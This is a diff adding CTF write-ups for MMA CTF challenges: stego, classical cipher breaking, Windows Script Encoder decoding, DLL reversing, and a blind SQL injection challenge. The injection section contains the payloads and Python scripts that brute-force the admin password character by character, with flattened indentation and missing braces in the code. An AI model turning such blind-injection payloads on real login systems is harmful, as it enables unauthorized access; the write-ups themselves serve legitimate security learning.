@@ -4,18 +4,28 @@
     <meta id='page-params'
     theme='journal'
     title='Tontons Fl4ggeurs'
-    menu='Home,../index.html,WriteUp du MMA,pages/mma.html'
+    menu='Home,../index.html,WriteUp du MMA,mma.html'
     active='2'
     root=''>
     <xmp>
 <br/>
 <br/>
 
-
-## Pattern Lock 1
+********************
+## [Welcome!!](http://score.mmactf.link/problems/1?locale=en) *10*
 by TiWim
+********************
 
-Une simple recherche sur votre moteur de recherche préféré suffisait pour trouver le nombre maximal de combinaisons possibles.
+Do you really need a write up about this problem?
+
+> The flag is "MMA{Welcome_To_MMACTF!!}"
+
+********************
+## [Pattern Lock 1](http://score.mmactf.link/problems/2?locale=en) *20*
+by TiWim
+********************
+
+Une simple recherche sur votre moteur de recherche pr&eacute;f&eacute;r&eacute; suffisait pour trouver le nombre maximal de combinaisons possibles.
 
 Parmis tous les sites possibles, en voici un:
 
@@ -25,8 +35,10 @@ http://stackoverflow.com/questions/12127833/patterns-possible-on-3x3-matrix-of-n
   Flag1: 389112
 ```
 
-## Nagoya Castle
+****************
+## [Nagoya Castle](http://score.mmactf.link/problems/14?locale=en) *100*
 by TiWim
+****************
 
 We had an image to download:
 
@@ -38,7 +50,273 @@ The flag was hidden in the Least Significant Bits:
 ![flag](flagNagoya.bmp)
 
 
+*****************
+## [Login as admin](http://arrive.chal.mmactf.link/login.cgi) *30*
+by sourceperrier
+*****************
+Nous sommes en pr&eacute;sence d'une injection sql en aveugle.
 
+#### Premier constat
+
+Dans le champs username :
+
+__admin' and 1=1 -- __ donne une authentification r&eacute;ussie
+__admin' and 1=2 -- __ donne une authentification &eacute;chou&eacute;e
+
+#### Trouver la taille du password
+
+On va tester &agrave; chaque fois la requ&egrave;te __admin' and length(password)=XX -- __, où XX va prendre toutes les tailles possibles.
+
+On utilise pour &ccedil;a un petit script qui va nous servir pour la suite:
+
+```python
+# ! /usr/bin/python
+# -*- coding : utf-8 -*-
+
+import mechanize
+import urllib
+
+for i in range(50) :
+params = 'username' : "admin' and length(password)=" + str(i) + " --",
+'password' : 'rien'
+http_params = urllib.urlencode(params)
+
+rep = mechanize.Browser().open('http://arrive.chal.mmactf.link/login.cgi', http_params).read()
+if rep.find('The flag is your password') != -1 :
+print 'len password : %d' %i
+exit(0)
+```
+> len password : 20
+
+#### Trouver le mot de passe :
+
+On va tester &agrave; chaque fois la requ&egrave;te admin' and substr(password,XX,1)=chr(YY) --",
+où XX va prendre toutes les positions de caract&egrave;res : 1 &agrave; 20
+et YY va prendre toutes les caract&egrave;res ASCII possibles.
+
+Voici le script de l'exploit final:
+
+```python
+# ! /usr/bin/python
+# -*- coding : utf-8 -*-
+
+import mechanize
+import urllib
+
+flag = ''
+for pos in range(20) :
+print 'position : %d' % pos
+for car in 'MA0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLNOPQRSTUVWXYZ_-*. : ;, ?=+' :
+print '\t-> tested characted : %s' % car
+
+params = 'username' : "admin' and substr(password," + str(pos+1) + ",1) = char(" + str(ord(car)) + ") --",
+'password' : 'rien'
+http_params = urllib.urlencode(params)
+
+rep = mechanize.Browser().open('http://arrive.chal.mmactf.link/login.cgi', http_params).read()
+if rep.find('The flag is your password') != -1 :
+flag += car
+print 'password (pour le moment) : %s' % flag
+break
+
+print 'flag : %s' % flag
+```
+>  Et voici le flag : __MMAcats_alice_band__
+
+
+
+*********************************************************************************
+## [Smart Cipher System 1](http://bow.chal.mmactf.link/~scs/crypt2.cgi) *10*
+by sourceperrier
+*********************************************************************************
+
+On a :
+36 36 2a 64 4b 4b 4a 21 1e 4b 1f 20 1f 21 4d 4b 1b 1d 19 4f 21 4c 1d 4a 4e 1c 4c 1b 22 4f 22 22 1b 21 4c 20 1d 4f 1f 4c 4a 19 22 1a 66
+
+Quand on va sur http://bow.chal.mmactf.link/~scs/crypt2.cgi, on fait des tests
+
+AAA donne 2a 2a 2a
+
+BBB donne 2b 2b 2b
+
+On va tester un "C&eacute;sar"
+
+% python
+Python 2.7.3 (default, Mar 14 2014, 11:57:14)
+[GCC 4.7.2] on linux2
+Type "help", "copyright", "credits" or "license" for more information.
+>>> ord(’A’) - 0x2a
+23
+>>> flag = ’’
+>>> for i in ’36 36 2a 64 4b 4b 4a 21 1e 4b 1f 20 1f 21 4d 4b 1b 1d 19 4f 21 4c 1d 4a 4e 1c 4c 1b 22 4f 22 22 1b 21 4c 20 1d 4f 1f 4c 4a 19 22 1a 66’.split(’ ’) :
+... flag += chr(23 + int(i, 16))
+...
+>>> flag
+’MMAbba85b6768db240f8c4ae3c29f9928c74f6ca091’
+
+*********************************************************************************
+** Epreuve : Smart Cipher System (http://bow.chal.mmactf.link/~scs/crypt4.cgi) **
+*********************************************************************************
+
+On a :
+e3 e3 83 21 33 96 23 43 ef 9a 9a 05 18 c7 23 07 07 07 c7 9a 04 33 23 07 23 ef 12 c7 04 96 43 23 23 18 04 04 05 c7 fb 18 96 43 ef 43 ff
+
+Quand on va sur http://bow.chal.mmactf.link/~scs/crypt4.cgi, on fait des tests
+
+AAA donne 83 83 83
+BBB donne 2c 2c 2c
+
+C&eacute;sar ?
+
+>>> 0x83 - ord(’A’)
+66
+>>> 0x2c - ord(’B’) 22
+
+Non, ce n’est pas un c&eacute;sar.
+
+xor ?
+
+>>> 0x83 ^ ord(’A’)
+194
+>>> 0x2c ^ ord(’B’)
+110
+
+Non ce n’est pas un xor.
+
+AAAAAAAAAA donne 83 83 83 83 83 83 83 83 83 83
+
+Donc, c’est un caract&egrave;re chiffr&eacute; par un octet...
+
+On va se cr&eacute;er une table :
+
+ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789abcdefghijklmnopqrstuvwxyz-_+=-*
+donne 83 2c 1a 1b 6e 5a a0 52 3b d6 b3 29 e3 2f 84 53 d1 00 ed 20 fc b1 5b 6a cb be 04 c7 23 c3 18 96 05 9a 07 12 ef aa fb 43 4d 33 85 45 f9 02 7f 50 3c 9f a8 51 a3 40 8f 92 9d 38 f5 bc b6 da 21 ff d8 cf f1 27 d8 e5
+
+>>> alpha = ’ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789abcdefghijklmnopqrstuvwxyz-_+=-*’
+>>> chiffre = ’83 2c 1a 1b 6e 5a a0 52 3b d6 b3 29 e3 2f 84 53 d1 00 ed 20 fc b1 5b 6a cb be 04 c7 23 c3 18 96 05 9a 07 12 ef aa fb 43 4d 33 85 45 f9 02 7f 50 3c 9f a8 51 a3 40 8f 92 9d 38 f5 bc b6 da 21 ff d8 cf f1 27 d8 e5’.split(’ ’)
+>>> flag = ’’
+>>> for i in ’e3 e3 83 21 33 96 23 43 ef 9a 9a 05 18 c7 23 07 07 07 c7 9a 04 33 23 07 23 ef 12 c7 04 96 43 23 23 18 04 04 05 c7 fb 18 96 43 ef 43 ff’.split(’ ’) :
+... flag += alpha[chiffre.index(i)]
+...
+>>> flag
+’MMAf52da776412888170f282a9105d2240061c45dad
+
+*********************************************************************************
+** Epreuve : Smart Cipher System (http://bow.chal.mmactf.link/~scs/crypt5.cgi) **
+*********************************************************************************
+
+On a :
+60 00 0c 3a 1e 52 02 53 02 51 0c 5d 56 51 5a 5f 5f 5a 51 00 05 53 56 0a 5e 00 52 05 03 51 50 55 03 04 52 04 0f 0f 54 52 57 03 52 04 4e
+
+Quand on va sur http://bow.chal.mmactf.link/~scs/crypt5.cgi, on fait des tests
+
+Apr&egrave;s plusieurs test, on se rend compte que l’octet obtenu d&eacute;pend du premier
+
+On se doute que le flag commence par MMA
+
+Donc le second caract&egrave;re vaut 00 car M ^ M vaut 0
+
+script :
+
+>>> flag, p = ’M’,’M’
+>>> for i in ’60 00 0c 3a 1e 52 02 53 02 51 0c 5d 56 51 5a 5f 5f 5a 51 00 05 53 56 0a 5e 00 52 05 03 51 50 55 03 04 52 04 0f 0f 54 52 57 03 52 04 4e’.split(’ ’)[1 :] :
+... p = chr(ord(p) ^ int(i, 16))
+... flag += p
+...
+>>> flag
+’MMAe75fd59d2c9f9c227d28ff412c3fea3787c1fe73’
+
+#Write Up MQAAA
+by myrti
+
+I got lucky with this challenge. I first looked at the original string and it's easily seen that this is base64, so I decrypted that and got:
+```syntaxe
+#@~^MQAAAA== Um.bwDR+1tKcJtH) Dtnm6VlTmhKDN|rd{K46EdmCObWU8rbjRIAAA==^#~@
+```
+I immediately recognized the #@~^ from another challenge I recently did and after some soul-searching remembered that this belongs to Windows Script Encoder. A quick google search revealed this tool: [srcdec](https://gist.github.com/bcse/1834878) capable of decrypting it:
+
+The decrypted code contains:
+```syntaxe
+WScript.echo("MMA{the_flag_word_is_obfuscation}")
+```
+which is the flag! :)
+
+
+#Write up   How to use
+
+After downloading the file, the first thing I did was to run it through the strings command. Two things stood out:
+``` syntaxe
+C:\Users\Administrator.IMADA-PC\Documents\Visual Studio 2008\Projects\howtouse\Release\howtouse.pdb
+```
+and
+```syntaxe
+howtouse.dll
+```
+So we're dealing with a DLL. The next thing I did was to look at the file with [dependency walker](http://www.dependencywalker.com/) which gave me a list of imported and exported functions.
+
+There is only one exported function: fnhowtouse(int).
+
+After trying in vain to run the file with rundll or otherwise for quite some time, I opened it up in [IDA (free)](https://www.hex-rays.com/products/ida/support/download_freeware.shtml) to look at the fnhowtouse module.
+
+It looks like this:
+```syntaxe
+...
+var_30= dword ptr -30h
+var_2C= dword ptr -2Ch
+var_28= dword ptr -28h
+var_24= dword ptr -24h
+var_20= dword ptr -20h
+var_1C= dword ptr -1Ch
+var_18= dword ptr -18h
+var_14= dword ptr -14h
+var_10= dword ptr -10h
+var_C= dword ptr -0Ch
+var_8= dword ptr -8
+var_4= dword ptr -4
+arg_0= dword ptr  4
+
+sub     esp, 0B4h
+mov     eax, offset loc_10001080
+mov     [esp+0B4h+var_B4], eax
+mov     [esp+0B4h+var_B0], eax
+mov     eax, offset loc_10001090
+mov     [esp+0B4h+var_90], eax
+mov     [esp+0B4h+var_84], eax
+mov     [esp+0B4h+var_80], eax
+push    esi
+mov     eax, offset loc_100010A0
+...
+
+```
+
+
+
+So from the looks of it, there's individual characters defined which are then filled by copying something from the .text section. Looking at the .text section we see:
+```syntaxe
+.text:10001010  B8 61 00 00 00 C3 CC CC  CC CC CC CC CC CC CC CC  ©a...+¦¦¦¦¦¦¦¦¦¦
+.text:10001020  B8 62 00 00 00 C3 CC CC  CC CC CC CC CC CC CC CC  ©b...+¦¦¦¦¦¦¦¦¦¦
+.text:10001030  B8 63 00 00 00 C3 CC CC  CC CC CC CC CC CC CC CC  ©c...+¦¦¦¦¦¦¦¦¦¦
+.text:10001040  B8 64 00 00 00 C3 CC CC  CC CC CC CC CC CC CC CC  ©d...+¦¦¦¦¦¦¦¦¦¦
+.text:10001050  B8 65 00 00 00 C3 CC CC  CC CC CC CC CC CC CC CC  ©e...+¦¦¦¦¦¦¦¦¦¦
+.text:10001060  B8 66 00 00 00 C3 CC CC  CC CC CC CC CC CC CC CC  ©f...+¦¦¦¦¦¦¦¦¦¦
+.text:10001070  B8 41 00 00 00 C3 CC CC  CC CC CC CC CC CC CC CC  ©A...+¦¦¦¦¦¦¦¦¦¦
+.text:10001080  B8 4D 00 00 00 C3 CC CC  CC CC CC CC CC CC CC CC  ©M...+¦¦¦¦¦¦¦¦¦¦
+.text:10001090  B8 30 00 00 00 C3 CC CC  CC CC CC CC CC CC CC CC  ©0...+¦¦¦¦¦¦¦¦¦¦
+.text:100010A0  B8 31 00 00 00 C3 CC CC  CC CC CC CC CC CC CC CC  ©1...+¦¦¦¦¦¦¦¦¦¦
+.text:100010B0  B8 32 00 00 00 C3 CC CC  CC CC CC CC CC CC CC CC  ©2...+¦¦¦¦¦¦¦¦¦¦
+.text:100010C0  B8 33 00 00 00 C3 CC CC  CC CC CC CC CC CC CC CC  ©3...+¦¦¦¦¦¦¦¦¦¦
+.text:100010D0  B8 34 00 00 00 C3 CC CC  CC CC CC CC CC CC CC CC  ©4...+¦¦¦¦¦¦¦¦¦¦
+.text:100010E0  B8 37 00 00 00 C3 CC CC  CC CC CC CC CC CC CC CC  ©7...+¦¦¦¦¦¦¦¦¦¦
+.text:100010F0  B8 38 00 00 00 C3 CC CC  CC CC CC CC CC CC CC CC  ©8...+¦¦¦¦¦¦¦¦¦¦
+.text:10001100  B8 39 00 00 00 C3 CC CC  CC CC CC CC CC CC CC CC  ©9...+¦¦¦¦¦¦¦¦¦¦
+.text:10001110  B8 7B 00 00 00 C3 CC CC  CC CC CC CC CC CC CC CC  ©{...+¦¦¦¦¦¦¦¦¦¦
+.text:10001120  B8 7D 00 00 00 C3 CC CC  CC CC CC CC CC CC CC CC  ©}...+¦¦¦¦¦¦¦¦¦¦
+```
+This looks promising.
+
+From there on it's simply a matter of filling in the letters stored in .text into the variables defined in the module and then sorting them in ascending order. This leads to the flag:
+
+MMA{fc7d90ca001fc8712497d88d9ee7efa9e9b32ed8}
 
 
     </xmp>
